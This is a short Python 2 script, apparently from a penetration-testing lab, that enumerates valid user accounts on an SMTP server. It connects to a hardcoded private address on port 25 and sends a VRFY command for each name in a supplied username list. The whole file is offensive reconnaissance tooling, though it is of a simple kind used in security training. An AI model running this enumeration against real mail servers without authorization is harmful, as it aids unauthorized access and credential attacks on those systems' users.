#This script will run a bruteforce against SMTP (PORT 25) with a specified username list. 

#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:
        print "Usage: vrfy.py <filename.txt>"
        sys.exit(0)
# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect = s.connect(('10.11.1.217',25))
# Receive the banner
banner = s.recv(1024)
print banner
# VRFY a user
def reading():
  with open(sys.argv[1], "r") as a_file:
    for line in a_file:
      lines= line.strip()
      verifying(lines) 
def verifying(user):
    s.send('VRFY ' + user + '\r\n')
    result = s.recv(1024)
    print result
reading()
# Close the socket
s.close()

